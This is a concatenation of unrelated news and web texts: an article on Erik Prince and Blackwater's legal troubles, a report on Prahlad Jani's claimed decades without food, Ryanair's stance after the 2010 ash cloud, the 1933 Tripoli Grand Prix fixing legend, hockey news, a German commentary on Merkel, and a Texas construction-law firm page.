" I have a policy on not discussing my client ’s personal lives — especially when that client is a private citizen , " Corallo , who runs his own crisis management and PR firm , said in an e-mail to The Nation .
" It is nobody ’s business where Mr. Prince ( or anyone else ) chooses to live .
So I ’m afraid I will not be able to confirm any rumors . "
A source with knowledge of the federal criminal probe into Blackwater ’s activities told The Nation that none of Prince ’s indicted colleagues have flipped on Prince since being formally charged , but rumors abound in Blackwater and legal circles that Prince may one day find himself in legal trouble .
Former Blackwater employees claim they have provided federal prosecutors with testimony about what they allege is Prince ’s involvement in illegal activity .
If Prince ’s rumored future move is linked to concerns over possible indictment , the United Arab Emirates would be an interesting choice for a new home — particularly because it does not have an extradition treaty with the United States .
" If Prince were not living in the US , it would be far more complicated for US prosecutors to commence an action against him , " says Scott Horton , a Columbia University Law lecturer and international law expert who has long tracked Blackwater .
" There is a long history of people thwarting prosecutors simply by living overseas . "
The UAE , Horton says , is " definitely a jurisdiction where Prince could count on it not being simple for the US to pursue him legally . "
The UAE is made up of seven states , the most powerful among them being Dubai and Abu Dhabi .
Since 9/11 , they have emerged as hubs for the US war industry .
" Global service providers " account for some three - quarters of Dubai ’s GDP , while oil represents only 3 percent .
" They have established themselves as the premiere location in the Middle East for offshore banking and professional services , " says Horton , who has legal experience in the UAE .
" If you have connections to the royal families , then the law does n’t really apply to you .
I would be very surprised if Erik Prince does not have those kinds of connections there . "
As a matter of policy the Justice Department will not discuss possible investigations of people who have not yet been charged with a crime .
Two former employees made serious allegations against Prince last August in sworn declarations filed as part of a civil lawsuit against Prince and Blackwater .
One former employee alleged that Prince turned a profit by transporting " illegal " or " unlawful " weapons into Iraq on his private planes .
A four - year employee of Blackwater , identified in his declaration as " John Doe # 2 , " stated that " it appears that Mr. Prince and his employees murdered , or had murdered , one or more persons who have provided information , or who were planning to provide information , to the federal authorities about the ongoing criminal conduct . "
He also stated that " Mr. Prince feared , and continues to fear , that the federal authorities will detect and prosecute his various criminal deeds , " adding : " On more than one occasion , Mr. Prince and his top managers gave orders to destroy emails and other documents .
Many incriminating videotapes , documents and emails have been shredded and destroyed . "
John Doe # 2 ’s identity was concealed in the sworn declaration because he " fear [s ] violence against me in retaliation for submitting this Declaration . "
He also alleged , " On several occasions after my departure from Mr. Prince ’s employ , Mr. Prince ’s management has personally threatened me with death and violence . "
Doe # 2 stated in his declaration that he provided the information contained in his statement " in grand jury proceedings convened by the United States Department of Justice . "
Prince is also facing civil lawsuits brought by Iraqi victims of Blackwater .
Among these is a suit filed in North Carolina by the family of 9 - year - old Ali Kinani .
Kinani ’s family alleges he was shot in the head and killed by Blackwater operatives in the infamous Nisour Square massacre in Baghdad in 2007 .
Earlier this year , Prince claimed he was spending $ 2 million a month in legal fees and on what he described as a “ giant proctological exam ” by nearly a dozen federal agencies .
Even if prosecutors believed they had enough evidence to charge Prince with a crime , because of the classified nature of some of Blackwater and Prince ’s work for the CIA and other agencies of the US government , prosecuting him could prove challenging .
Prince has deep knowledge of covert US actions that the US government or military may not want public , which could be revealed as part of a potential defense Prince could offer .
Blackwater — and Prince specifically — long worked on the CIA ’s assassination program .
Some observers believe that Prince has already engaged in " graymail " by revealing some details of his classified work for the CIA and military , specifically in a January 2010 article in Vanity Fair , written by a former CIA lawyer .
Graymail is a legal tactic that has been used for years by intelligence operatives or assets who are facing prosecution or fear they soon will be .
In short , these operatives or assets threaten to reveal details of sensitive or classified operations in order to ward off indictments or criminal charges , based on the belief that the government would not want these details revealed .
After Jackson and the other former Blackwater executives were indicted , their lawyers claimed that the US government approved of their conduct .
" All of this was with the knowledge of , the request of , for the convenience of , an agency of the US government , " Jackson ’s lawyer Ken Bell told the judge during a bond hearing in April .
Bell did not reveal which agency he was referring to and did not answer questions from reporters .
The latest developments in the Blackwater story come after a two - year campaign by Blackwater to rebrand itself as " Xe Services " and the " US Training Center . "
In March 2009 , Prince announced he was stepping down as CEO of the company , though he has remained its sole owner .
While Blackwater continues to be a significant player in US operations in Afghanistan under the Obama administration — working for the State Department , Defense Department and CIA — it is facing increased scrutiny on Capitol Hill and continued pressure from the Justice Department .
On June 11 , federal prosecutors filed a massive brief in their appeal of last year ’s dismissal by a federal judge of manslaughter charges against the Blackwater operatives alleged to be the " shooters " at Nisour Square .
In the brief , prosecutors asked that the indictment of the Blackwater men be reinstated .
Meanwhile , two other Blackwater operatives were indicted in January on murder charges stemming from a shooting in Afghanistan in May 2008 .
Senator Carl Levin , chair of the Senate Armed Services Committee has called on the Justice Department to investigate Blackwater ’s use of a shell company , Paravant , to win training contracts in Afghanistan .
Blackwater has been spending heavily this year on lobbyists — particularly Democratic ones .
In the first quarter of 2010 , the company spent more than $ 500,000 for the services of Stuart Eizenstat , a well - connected Democratic lobbyist who served in the Clinton and Carter administrations .
Eizenstat heads the international practice for the powerhouse law and lobbying firm Covington and Burling .
Prince sold Blackwater ’s aviation division earlier this year for $ 200 million .
In announcing last week that the rest of Blackwater was up for sale , the company said in a statement that Blackwater ’s " new management team has made significant changes and improvements to the company over the last 15 months , which have enabled the company to better serve the US government and other customers , and will deliver additional value to a purchaser . "
While Blackwater has tried to shed the Blackwater name in many aspects of its business , the company has recently opened a series of Blackwater " Pro- Shop " retail stores , offering merchandise bearing the Blackwater name and original logo .
Among the items for sale : pink Blackwater baby onesies , Blackwater pint glasses , Blackwater beach towels and , of course , rifles .
In a speech in January , obtained by The Nation , Prince said that he intends to publish a book this fall .
He was originally slated to come out with a book in June 2008 with the title We Are Blackwater .
The man who says he has n't eaten or drunk for 70 years :
Why are eminent doctors taking him seriously ?
There are few people , however busy their lives , unable to remember the last meal that they consumed .
But Prahlad Jani is one of them .
And the reason is that the last morsel of food that he says passed his lips did so in the early years of World War II .
‘ I ca n’t recall exactly what it was , ’ the 82 - year - old Indian admits .
‘ It was such a long time ago . ’
During the 70 - odd years since , Mr Jani says he has eaten not so much as a single grain of rice nor consumed a drop of water .
And while such an extended gap between meals might be expected to have a fatal impact on the activities of one so deprived , this octogenarian says he ’s never felt better .
Tests : 83 - year - old Prahlad Jani has twice attended hospital to be watched round the clock by eminent doctors
‘ Although I walk 100 or 200 kilometres in the jungle , I never sweat and do n’t feel tired or sleepy , ’ he says .
‘ I can meditate for three , eight or 12 hours — or even months . ’
No food ?
No water ?
Superhuman strength ?
One straitjacket ( size zero ) for Mr Jani , please .
It is , of course , more than tempting to dismiss this Hindu holy man and his claims as the stuff of absolute nonsense .
Medical science tells us that human beings rarely survive more than a week without water , and a couple of months at most without food .
To even suggest otherwise is ridiculous , and also potentially dangerous .
Practitioners of extreme starvation diets can cause serious damage to their bodies , leading to death .
And yet , despite all that is known , there is a growing bandwagon that says Mr Jani and his incredible claims should not be dismissed entirely out of hand .
On Thursday afternoon , he emerged from hospital in the Indian state of Gujarat , where he had spent 15 days .
He was monitored around the clock and , according to the medics who oversaw him , consumed no food and no water whatsoever .
No human should be able to survive such conditions unscathed — the lack of water alone should have killed him .
But Mr Jani apparently suffered absolutely no ill - effects at all .
Hindu : Mr Jani is one of countless from his religion to make claims of unworldly feats
Attending a press conference at the Sterling Hospital in Ahmedabad , he said : ‘ I am fit and strong today and even the doctors agree .
They ran every test possible for 15 days and proved that I do not need food to keep me strong .
' I am strong and healthy , because it is the way God wants me to be . ’
So what is the explanation for his ability to endure such privations ?
No one knows for sure .
But over the next three months , the medics will attempt to come up with some answers as they study the results of a battery of tests .
Military scientists drawn from India ’s Defence Research and Development Organisation believe that Mr Jani could hold the key to understanding how humans can be taught to survive for long periods without sustenance .
‘ It is possible that it will be able to help save human lives during natural disasters , high altitude , sea journeys and other natural and human extremities , ’ said a spokesman for the team .
‘ We can educate people about the survival techniques in adverse conditions with little food and water , or nothing at all . ’
He added : ‘ If his claims are verified , it will be a breakthrough in medical science . ’
By any standards that is a very big ‘ if ’ .
For starters , the doctors are considering only the two weeks during which Mr Jani was under their supervision .
His claims not to have eaten for the preceding seven decades can and will never be
verified .
The same goes for much of his early history .
According to his version of events — and there is no other —
Mr Jani left his home in Rajasthan at the age of seven , and went to live in the jungle .
When he reached the age of 11 , he underwent a religious experience during which he became a follower of the Hindu goddess Amba .
In her honour , he chose to dress as a female devotee , wearing a red sari - like garment , nose - ring , bangles and crimson flowers in his shoulder - length hair .
In return , Mr Jani believes that the goddess has sustained him ever since by feeding him with a lifegiving , invisible ‘ elixir ’ , which has supposedly given him the strength to continue without food or water .
For at least the past 40 years , Mr Jani has been living , hermit - like , in a cave in the jungles close to the Gujarati temple of Ambaji .
He rises at 4 am , spending most of the day meditating .
While well - known locally , for many years Mr Jani was no more famous than the millions of other Hindu holy men — sadhus or yogi as they are known — in India .
Mystical figures , these individuals renounce normal life for one on the margins of society , focusing every waking minute on the spiritual .
They often assume austere or extreme practices — standing on one leg or refusing to talk for years on end .
Like Mr Jani , many sadhus regularly undergo lengthy periods of fasting .
But the claim that his fast had endured for decades caught the public imagination and first propelled him into the limelight .
Challenged to prove that he could survive without food or water , in 2003 he underwent his first hospital investigations .
Then , as now , he was placed under the care of Dr Sudhir Shah , a consultant neurologist from Ahmedabad who specialises in studying people with seemingly ‘ supernatural ’ powers .
Doctors had prepared a special glass - walled room equipped with CCTV cameras to monitor Mr Jani for ten days .
The toilet was sealed to test his claim that he had no need to urinate or defecate .
The only fluid allowed was a small amount of water , to use as mouthwash .
This was collected and measured in a beaker when he spat it out , to make sure that none had been drunk .
Scans revealed some urine accumulation in his bladder , but this seemed to be re-absorbed by the body because it was never passed .
In every other respect , clinically , Mr Jani was found to be perfectly normal .
While the results secured him an international following , they failed to offer any concrete answers .
As a result , Dr Shah and the military team decided to repeat the experiment this year .
' We may never know the truth , but until he is exposed as a fraud , perhaps we should enjoy suspending our disbelief and give Mr Jani the benefit of the doubt '
So , on April 22 , Mr Jani re-entered the hospital for 15 days of tests .
They ended on Thursday afternoon with doctors admitting that they were baffled by what they had seen .
Presenting their preliminary findings , Dr Shah was joined by biologist Dr Ilavashagn , director of the Defence Institute of Physiology and Allied Sciences ( DIPAS ) , a heavily - funded department of the Defence Research and Development Organisation .
The doctors announced that despite apparently living on thin air for two weeks , the holy man was more healthy than someone half his age .
Blood tests , hormone profiles , MRIs and angiographs ( imaging tests of the blood vessels ) all pointed to the conclusion that Mr Jani had not needed to eat , drink or use the toilet once .
Dr Ilavazhagn said : ‘ Clinical , biochemical , radiological and other relevant examinations were done on Prahlad Jani and all reports were within the safe range throughout the study .
He is healthy , his mind is sharp .
' What is truly astonishing , and something we have no explanation for , is that he has not passed stools or urine .
To my knowledge , that is medically unprecedented . ’
There will be many who maintain that the latest tests prove nothing — and that Mr Jani ’s survival is down to nothing more mysterious than trickery .
That ’s the view held by the Indian Rationalist Association , an organisation which publicly campaigns against superstition and spiritual fraudsters .
It has attacked the Indian Ministry of Defence for even agreeing to take part in the tests , accusing them of being ‘ taken in by the absurd claims of a village fraud ’ .
Sanal Edamaruku , the association ’s secretary general , told the Mail : ‘ I asked to be allowed to send an independent team to survey the room where this test is taking place , but I was repeatedly turned down .
' It is ridiculous to ask people to believe that any man can go 15 days , let alone 70 years , without food or water .
Seven decades : Mr Jani claims he had a religious experience as a teenager
‘ Dr Shah has been in charge of three similar investigations over the past ten years , and he has never allowed independent verification .
' In 2000 , he was asking for funds to investigate a man he claimed got his energy from the sun , just like plants do .
‘ In 2003 , he even approached NASA for funds to investigate Mr Jani , claiming astronauts might benefit from the research .
This particular hospital , led by this particular doctor , keeps on making these claims without ever producing evidence or publishing research . ’
Mr Edamaruku is convinced that Mr Jani must have had access to food and water at the hospital , and does not believe that he was kept under strict supervision around the clock .
He says that whenever the Rationalist Association has investigated individuals making similar claims , all have been exposed as frauds .
In 1999 , they investigated a woman who claimed that she was the reincarnation of another Hindu goddess .
For five years , she had remained alone in a small closet where it was claimed she had not eaten nor passed any urine or faeces .
In co-operation with the police , investigators from the association searched the room , finding a toilet hidden behind a shelf and a disguised hole through which she received food .
Blood tests revealed the presence of glucose , indicating the intake of food .
To further prove the case , a gas was released into the room that made the woman vomit .
The contents of her stomach were found to include pieces of recently - eaten chapatti and potatoes .
' I am strong and healthy , because it is the way God wants me to be , ’ says Prahlad Jani
Mr Edamaruku is concerned that by publicising the activities of individuals such as Mr Jani , others will be encouraged to copy .
‘ The Hindu religion is a belief system that ’s all about magical thinking , about great things happening that are not understandable to the ordinary person , ’ he explained .
‘ These claims are very dangerous , because people try to follow these holy men and can end up hurting themselves .
‘ In any other religion there ’s a priest who requires a lot of training and there ’s a structure which means people can’t just make up their qualifications .
' In Hinduism , anyone can become a guru overnight .
You just decide that ’s what you are , dress the part and become it . ’
Perhaps he ’s right .
Does n’t logic and common sense dictate that Prahlad Jani must be tricking the world somehow ?
And yet , there ’s a part of all of us that would love to believe such a human ‘ miracle ’ could be true .
After all , is n’t a consultant neurologist staking his reputation on these tests being entirely watertight ?
We may never know the truth , but until he is exposed as a fraud , perhaps we should enjoy suspending our disbelief and give Mr Jani the benefit of the doubt .
After all , would n’t life be boring if everything was rational ?
The budget airline Ryanair today sparked a furious response from politicians and risked a consumer backlash by refusing to pay the hotel and food bills of passengers stranded by the volcanic ash cloud , in a blatant refusal to abide by strict EU consumer rules .
As Britain 's skies opened for business at last after a catastrophic six - day shutdown , the carrier 's chief executive , Michael O'Leary , told passengers his airline would not meet hotel and subsistence expenses incurred while they were stuck abroad .
Ryanair would reimburse travellers the original price of their air fare and no more , he said .
Europe - wide regulations demand that airlines provide food and drinks and hotel accommodation if appropriate when passengers are stranded .
There are no time or monetary limits on the commitment , which Ryanair repeats on its website .
Pressed on the legality of his stance , O'Leary challenged Ireland 's airline regulator , the Commission for Aviation Regulation , to take him to court .
It is estimated Ryanair 's stance could affect as many as 400,000 passengers , and potentially save the airline millions of pounds .
The firm was alone in promising to defy the law , but the main European and international airline industry bodies yesterday also attacked the regulations and demanded an urgent review on the basis that they were not intended for extraordinary situations such as erupting volcanos .
Mike Carrivick , chief executive of the Board of Airline Representatives ( BAR ) , which represents more than 90 airlines including British Airways , Virgin and BMI , said the relevant regulation was intended to apply when airlines had individual delays or cancelled flights .
" It was never intended to apply to wholesale shutdown of the airways system imposed by governmental rulings and without any limitation of time . "
The regulations , said the BAR , were " draconian , disproportionate and impractical " .
O'Leary said : " There 's no legislation designed that says any airline getting a fare of €30 should be reimbursing passengers many thousands of euros for hotel accommodation .
It 's absurd .
I do n't have a problem with everything being grounded for a day or two but there should have been a much faster response by the governments and transport ministers and by the regulators .
This is one of these issues we want addressed – why exactly are the airlines expected to be reimbursing people 's hotels , meals and everything else when the governments are the ones who made a balls of this ? "
Norman Baker , the Liberal Democrat transport spokesman , said the airline 's position would make passengers think twice about future travel with Ryanair .
" This is shocking behaviour and rubs salt into the wounds for those who have been stranded overseas , " he said .
The row came on an otherwise hopeful day , as air travel started to return to normal with flights coming in and out of Britain on a regular basis for the first time in almost a week .
Virgin Atlantic flew a full schedule , while BAA said the transport secretary , Lord Adonis , had granted special permission for planes to land through the night at Heathrow .
British Airways said it would take time to return to a " full flying programme " as many of its planes and crew were out of position .
Thousands of Britons remained stranded abroad and the Foreign Office minister Chris Bryant admitted getting hundreds of thousands of people back to the UK was proving " phenomenally complicated and difficult " .
There were long queues for ferries at Calais and planes out of Britain at Heathrow .
The international airline association , IATA , says the volcano crisis has cost airlines more than $ 1.7bn in lost revenue .

Race - fixing is fortunately extremely rare , but the Tripoli Grand Prix in 1933 has entered folklore as one event that was tarnished in this way .
However , evidence suggests accusations levelled at those involved result from the inaccurately excitable recollections of a major figure in the sport rather than anything more sinister .
The opening of a state - of - the - art track in Tripoli in 1933 was supposed to herald a new era in motor - racing as well as providing another publicity coup for Benito Mussolini 's imperial ambitions and a boost Pietro Badoglio , the new governor of Libya .
A grand prix had been held in Tripoli between 1929 and 1931 , but had been poorly supported and a financial disaster .
Undeterred , Badoglio , using the convincing argument the race was vital for the colony 's profile , persuaded Mussolini to endorse and part - fund the project .
The result was a superb venue with all modern gadgetry , including electronic timing and start lights .
The track was a testing one , eight - and - a - half miles long and fast , and no expense was spared to promote the first event in May .
The top drivers of the day were lured to Libya to take part by huge prize money and royalty - style pampering .
The event should have been a landmark in racing history .
Instead it has become tarnished with allegations of race - fixing among the leading competitors .
In a marketing move ahead of its time , the authorities organised a lottery in Italy where 30 tickets would be drawn on the eve of the race and each one would be allocated to a starter .
The owner of the ticket of the winning car stood to receive 7,500,000 lire ( about $ 250,000 at the time ) .
And therein , according to subsequent accounts , lay the problem .
The story went that on the eve of the race , Achille Varzi received a visitor , Enrico Rivio , in his hotel room with an odd request - he asked Varzi to ensure he won .
The reason then became clear as he explained he owned the winning lottery ticket associated with Varzi 's car .
The offer Rivio made was to pay Varzi half of the lottery prize money if he delivered - even that was more than twice the prize for winning the race - and produced a contract drawn up by a solicitor to that effect .
Varzi , it is said , finished with a promise he would see what he could do .
The next day the track was packed with dignitaries and spectators sheltering from the intense heat .
Marshal Balbo , who was to become Libya 's governor later in the year and wearing his full military uniform , started the race , and all seemed to be going well as Sir Tim Birkin in a Masaratti led for four laps before being overtaken by Campari with Tazio Nuvolari and Baconin Borzacchini close behind .
Varzi , the favourite , was in the middle of the field .
Nuvolari took the lead when Campari retired with Varzi , his Bugatti suffering from engine problems - some way adrift .
However , Nuvolari pitted on the 27th lap and by the time he returned to the track Varzi was 30 seconds ahead .
At the start of the last lap , Varzi 's lead was down to a few seconds , and as the crowd roared their approval , the pair came round the final bend with Varzi desperately clinging on as Nuvolari attacked .
As they crossed the line Varzi was a couple of feet ahead .
An exhausted Varzi was lifted from his Alfa and carried shoulder high by spectators to receive his prize .
Rumours that something was n't quite right started circulating that night when Varzi , Nuvolari and Borzacchini were supposedly seen in their hotel drinking expensive champagne .
Within hours , talk of a fixed result was widespread .
Even at the time there was enough gossip to prompt L'Auto Italiana to report a fortnight after the race : " Many people , without knowing the reason , did not really believe in this defeat .
On the one hand , it is ridiculous to think that the two drivers had agreed a " fiddle " yet , on the other it is true that the two drivers ( and Borzacchini , who retired ) had made a pact with three holders of their [ lottery ] tickets .
It would have not mattered who had finished first " .
Varzi himself admitted a meeting had taken place between himself , Nuvolari , Borzacchini and the three lottery ticket holders ahead of the grand prix " to find a formula which did not contravene the sporting rules " of how to divide the money - but it took place in Rome and not in his hotel .
Other stories have different drivers being made similar offers by ticket holders .
Such a loose agreement was not in contravention of the rules or even the law , even if it was morally dubious .
It also meant that providing one of them won , which one did so was immaterial .
That undermined suggestions Nuvolari had thrown the race , as did contemporary accounts of the battle over the last few laps .
Within a few months the episode had been forgotten as Borzacchini and Campari died at Monza in September .
The fascist government in Italy also stifled the story which it felt reflected badly on the regime .
There the whole thing might have stayed but for the legendary Mercedes manager Alfred Neubauer .
In 1958 he published his autobiography Speed Was My Life and in it he made some wild claims against the drivers .
But Neubauer 's book showed he was not averse to embellishing stories , and what 's more , he was not even at Tripoli for the race .
He was , nevertheless , on safe ground as Varzi , the last of the three drivers involved , had died a decade earlier .
Neubauer 's account , however , is one that has gradually been accepted as fact , despite many glaring errors and it being completely at odds with what actually happened .
DETROIT -- Detroit Red Wings defenseman Andreas Lilja is an unrestricted free agent who hopes to re-sign with the Red Wings .
He returned following the Olympic break after missing 12 months with a concussion .
" I feel great , no problems , '' Lilja said .
" Both me and my family love it here .
We have to wait and see what happens . ''
The Red Wings likely will re-sign Derek Meech , a restricted free agent who wo n't cost much .
They have the flexibility to trade him if he can't crack the roster .
And that might be best for Meech , who has n't nailed down a regular spot in the lineup in three years .
" I had opportunities here and there , things just have n't worked as I 've liked them to , '' Meech said .
" But that 's not to say I did n't have a great experience here .
" If there 's an opportunity to go somewhere and get some minutes , that 's ultimately what any player wants to do .
That 'd be great . ''
Odds and ends
Red Wings coach Mike Babcock on unrestricted free agent Todd Bertuzzi : " Bert had a year that he has to feel good about .
It did n't go great all the time , but had a real good stretch , fell off and then really finished strong .
Detroit was a good fit for him as far as the players he got to play with .
Now , him and ( GM ) Kenny ( Holland ) will have to work that out . ''
Restricted free - agent forward Patrick Eaves , who missed the last four games against San Jose because of an elbow injury , would like to return .
" I loved it here , had a great year , '' Eaves said .
" The people in this organization , everyone was first - class .
It 's a great place to be . ''
Enforcer Brad May , who is contemplating retirement , said he is " going home to Toronto and reflect on this experience .
I do n't know if I 'm going to play or look to do other things .
Everybody here in Detroit 's been incredible , top to bottom .
It 'll come down to my family .
I 'll go home and have a couple of bottles of wine with my wife . ''
Red Wings assistant coach Paul MacLean will interview this week for the head coaching vacancy with the Columbus Blue Jackets .

CHL And IHL Complete Agreement
June 1 , 2010 - Central Hockey League ( CHL ) News Release
In a joint announcement that marks a historic day for minor professional hockey , two of pro hockey 's most storied leagues , the Central Hockey League ( CHL ) and International Hockey League ( IHL ) , have entered into a letter of intent to form a " AA " level super league beginning in the 2010 - 11 season .
We plan to play under the Central Hockey League , CHL , moniker , with the identity of the IHL being maintained through various aspects that will be announced in the near future .
Leaders of the CHL and IHL will meet during the week ahead to work out the remaining material terms .
" The arrangement between the CHL and the IHL should create an innovative and exciting " AA " level professional hockey league which is scheduled to start play in the 2010 - 2011 season , " said Dennis Hextall , IHL Commissioner .
" The two leagues each have longstanding histories and share the common goal of solidifying minor professional hockey for our players , our passionate fans and their communities .
I believe this arrangement will enable our teams to recruit the best young talent to join our league , with the potential of improving their game and moving up to the higher leagues . "
" This is an exciting day for our teams and markets , " said Duane Lewis , CHL Commissioner .
" Both leagues have worked hard to establish tremendous entertainment at a great value for their fans , and by combining our resources we believe we can strengthen those efforts providing greater fan interest as well as a stronger brand . "
Operating guidelines , including the teams competing in the CHL , divisional alignment , the 2010 - 11 regular season schedule and various hockey operations issues will be discussed at the CHL Summer Conference ( league meetings ) occurring June 3 - 5 in Gilbert , Arizona and will continue at the IHL meetings in Las Vegas , Nevada on June 21 - 23 .
The CHL competed with 15 teams during the 2009 - 10 season with the Rapid City Rush taking home the Ray Miron Presidents '
Cup title , while the IHL competed with seven teams with the Fort Wayne Komets winning their seventh Turner Cup Championship and third straight league title .
This will be the 19th season for the CHL whose teams cover nine states .
The league saw close to two million fans attend games in each of the last two seasons and has regularly been the North American professional " AA " hockey league leader in average attendance .
This season , the CHL was the top " AA " hockey league in playoff attendance .
In the league 's history , a total of 88 players have played in both the National Hockey League and the CHL .
The 2010 - 2011 season will mark the 60th year of professional hockey for the International Hockey League , which was comprised last season of seven Midwestern teams in Michigan , Ohio , Indiana , and Illinois .
More than 900,000 fans attended IHL hockey games this past season , and a sell - out crowd of 10,480 fans watched the Fort Wayne Komets win the 2010 Turner Cup over the Flint Generals at the Coliseum last month .
Nine players who played on IHL teams this past season had prior NHL experience , while many more have played for their respective national teams and professionally abroad .
The IHL's Commissioner , Dennis Hextall , spent more than ten years as a player in the National Hockey League , and serves as President of the Detroit Red Wings Alumni Association .

01.06.2010 , 19:43 Uhr | Ein Kommentar von Alexander Görlach
Das ist der Beginn des Endes von Angela Merkel : Die Bundeskanzlerin wird nun einem innerparteilichen Fanal ausgesetzt sein .
Sie hat den Bundespräsidenten am Wochenende , als seine Aussage zum Einsatz der Bundeswehr in der Kritik stand , nicht unterstützt .
Sie kommentiere die Aussagen Köhlers nicht weiter , ließ sie verlauten .
Horst Köhler war auf Betreiben Frau Merkels und Herrn Westerwelles 2004 zum Bundespräsidenten gewählt worden .
Schutzlos war der Bundespräsident , der seit seinem Amtsantritt der politischen Klasse , auch den Parteien , die ihn ins Amt gehoben hatten , auf die Füße getreten war .
Jeder durfte ihn mal kritisieren .
Das Magazin " Spiegel " hat den Sturz Köhlers eingeleitet .
Ohne das Nachrichtenportal wäre der Satz Horst Köhlers , der ihm nun zum Verhängnis geworden ist , untergegangen .
Fünf
Tage alt war die Aussage des Bundespräsidenten aus einem Radiointerview , als sie von Spiegel Online hochgezogen wurden .
Die Reaktionen trafen das Bundespräsidialamt unvorbereitet .
Köhler wurde Merkel zu unbequem
Zurück zu Frau Merkel : Nach dem Abgang des konservativen Roland Koch wird ihr nun auch der Weggang Horst Köhlers angelastet werden .
Wieder ein Opfer , wird es heißen .
Er wurde Merkel zu unbequem ; sie hat ihn abperlen und am ausgestreckten Arm verhungern lassen .
Friedrich Merz ist einer , der ein Lied davon singen kann .
Gemeinhin spricht man von einem Wechsel auf Bundesebene , so der Bundespräsident die Farbe wechselt .
Im schwarz - gelben Lager ist im Moment niemand in Sicht , der Köhler beerben könnte .
Der Job ist auch nicht sonderlich attraktiv .
Frau Merkel wird darauf achten , dass ihr der erste Mann ( die erste Frau ) im Staate nicht gefährlich werden kann .
Ähnlich wie mit Herman Gröhe im Adenauerhaus oder Ronald Pofalla im Kanzleramt , wird sie niemanden in Erwägung ziehen , der Unabhängigkeit von ihr an den Tag legen könnte .
Könnte Christian Wulff vielleicht das Amt übernehmen ?
Oder ein profilierter Konservativer wie Roland Koch ?
Was ist mit Wolfgang Schäuble , der schon einmal gerne zugegriffen hätte ?
Das sind nun alles mögliche Kandidaten der Union .
Der Christsoziale Edmund Stoiber könnte versucht sein , an eine Rückkehr zu denken .
Wen hat die SPD aufzubieten ?
Frau Schwan kann es noch ein drittes Mal versuchen .
Franz Müntefering oder Ulla Schmidt könnten antreten .
Die Unionsbasis kocht
Die Unionsbasis wird es der Kanzlerin so schnell nicht vergessen , dass sie ihren Bundespräsidenten abgesägt hat .
Das Volk im Ganzen wird das Frau Merkel so schnell nicht vergessen .
Köhler ist beliebt , sehr beliebt .
Das Volk wird die Politiker dafür bestrafen .
Die Wiederwahl Frau Merkels steht auf dem Spiel .
Das christlich - liberale Projekt ebenfalls – falls es so eines in den Köpfen der Partei - und Regierungsstrategen geben sollte .
Nach so vielen Rücktritten in den vergangenen Wochen und Monaten fehlt nun nur noch der Rücktritt Merkels .
Das klingt jetzt sehr utopisch .
Aber : Die Basis kocht und sie kocht schon sehr lange : Seit dem Jahr 2006 , seit sie in der Großen Koalition aus ihrer Sicht die ersten Unzumutbarkeiten hinnehmen musste .
Die Union , so sehen sie es , wickelt sich selbst ab .
Das Ende der letzten Volkspartei .
Bevor das passiert , muss Angela Merkel gehen .
Die negativen Folgen für Deutschland , die aus dieser unsicheren Situation nun entstehen , sind gewaltig .

As Texas Construction Lawyers We Know Commercial Constructions Disputes
It ’s rare for a commercial construction project to achieve substantial completion without encountering problems .
Sometimes the problems are minor and can easily be resolved , but most of the times they are so severe that they result in termination and / or withholding of payment .
As Board Certified Construction Attorneys , we have dealt with every type of commercial construction dispute imaginable .
If you have encountered a dispute on your project or are anticipating one , please contact us at ( 888 ) 368-2483 or submit the Contact Form so we can discuss your dispute and legal options for no charge .
Below are the four most common types of commercial construction disputes and their legal implications .
Delayed Performance
Both parties to a contract are required to perform their respective contractual obligations in a timely manner .
Property owners are typically required to timely obtain permits , provide the work space , select materials , respond to questions about the design , approve or reject change orders , and review and process payment applications in a timely manner .
Contractors and subcontractors are typically required to timely submit a project schedule , pre-order materials , retain subcontractors and material suppliers , provide lien waivers and releases , and deliver the work within the agreed time .
When a party fails to timely perform one or more material obligations under a contract , the other party may have the right to terminate the contract and seek money damages .
The starting point for determining your rights begins with your contract .
Most contracts require the non-defaulting party to formally serve a Notice of Default and allow the defaulting party an opportunity to cure .
If the defaulting party cannot timely cure the default or if the default cannot be cured , then the non-defaulting party may have the right to terminate the contract for cause and seek damages .
Property Owner Delays : can include : ( 1 ) failure to provide access to the agreed workspace ; ( 2 ) interference with access to the worksite ; ( 3 ) excessive change orders ; ( 4 ) failure to provide specific plans / specifications resulting in excessive RFI ’s ; ( 5 ) failure to timely provide materials or the correct materials ; and ( 6 ) failure to timely approve phases of the work .
Contractor Delays : can include : ( 1 ) failure to timely mobilize ; ( 2 ) failure to manage the project ; ( 3 ) failure to coordinate subcontractors ; ( 4 ) failure to purchase and deliver materials ; ( 5 ) failure to provide adequate manpower ; ( 6 ) failure to adhere to the project schedule ; ( 7 ) failure to properly perform the work resulting in correction work ; and ( 8 ) failure to timely obtain permits .
Property Owner Delay Damages : can include : ( 1 ) lost business / operation profits ; ( 2 ) lost rental value ; ( 3 ) increased interest charges and financing costs ; and ( 4 ) holdover rental expenses .
Sometimes a property owner ’s delay damages are quantified in the contract as liquidated damages .
However , to be enforceable , a liquidated damage provision must pass a two - part test : ( 1 ) the damages must be incapable or difficult to estimate at the time of entering into the contract ; and ( 2 ) the liquidated damage amount is a reasonable forecast of the actual damage that would be suffered from the delay .
Contractor Delay Damages : can include : ( 1 ) increased field overhead , such as personnel , temporary facilities , insurance , utilities and other field office costs ; ( 2 ) unabsorbed home office overhead ; ( 3 ) mobilization / demobilization costs ; ( 4 ) equipment rental fees ; ( 5 ) increased labor and material costs ; ( 6 ) loss of productivity from working out of sequence ; ( 7 ) lost profits ; and ( 8 ) lost business opportunity .
Some contracts contain a “ No Damage for Delay ” ( “ NDFD ” ) provision , wherein one or both parties waive their right to recover damages for delays .
However , there are five recognized exceptions to enforcing a NDFD provision , which include : ( 1 ) when the delay was not intended or contemplated by the parties to fall within the scope of the provision ; ( 2 ) when the delay resulted from intentional and / or bad acts by the one seeking to enforce the provision ; ( 3 ) when the delay has extended for such an unreasonable length of time that the party delayed would be justified in abandoning the contract ; ( 4 ) when the delay is not within the specific delays enumerated in the provision ; or ( 5 ) when the delay was caused by arbitrary and / or capricious conduct .
In Zachry Construction Corporation v. Port of Houston Authority of Harris County , ( No. 12-0772 -Aug. 29 , 2014 ) , the Texas Supreme Court recently examined the above exceptions and held that a party may not enforce a NDFD provision when the delay was caused by their own bad acts or capricious conduct .
Lovein Ribman ’s construction attorneys were among the first in the state to apply this new ruling , which in turn led to a sizable recovery for our client .
Some contracts also contain a “ Consequential Damage Waiver ” wherein both parties waive their respective right to recover consequential damages suffered as a result of a delay .
